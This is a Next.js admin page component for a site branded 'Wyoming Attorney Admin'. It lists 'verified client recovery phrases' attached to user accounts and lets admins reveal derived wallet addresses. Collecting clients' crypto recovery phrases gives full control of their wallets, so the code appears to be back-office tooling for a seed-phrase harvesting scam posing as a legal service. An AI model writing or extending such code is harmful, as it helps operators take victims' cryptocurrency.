import { AdminWalletsTable } from '@/components/admin/AdminWalletsTable';
import { PageHeader } from '@/components/ui';
import { listAdminUsers, listAllWallets } from '@/lib/queries';
import { requireAdmin } from '@/lib/session';

export const dynamic = 'force-dynamic';
export const metadata = { title: 'Linked Wallets — Wyoming Attorney Admin' };

export default async function AdminLinkedWalletsPage() {
    await requireAdmin();
    const [submissions, users] = await Promise.all([
        listAllWallets(),
        listAdminUsers()
    ]);

    // Submissions attached to user accounts
    const linkedSubmissions = submissions.filter((s) => Boolean(s.user_id));

    return (
        <div className="space-y-6">
            <PageHeader
                eyebrow="Administration · Wallets"
                title="Linked Wallets"
                description="Verified client recovery phrases attached to user accounts, with derived address tracking and access audits."
            />

            <div className="rounded-xl border border-emerald-200 bg-emerald-50 p-4 text-xs text-emerald-900 flex items-start gap-3">
                <span className="text-base">🔐</span>
                <div>
                    <strong className="font-semibold block mb-0.5">Active Account Linkages</strong>
                    These wallets are currently associated with client records. You can reveal derived addresses or unassign the submission if needed.
                </div>
            </div>

            <AdminWalletsTable
                submissions={linkedSubmissions}
                users={users.map((user) => ({ id: user.id, email: user.email, display_name: user.display_name }))}
                mode="queue"
            />
        </div>
    );
}
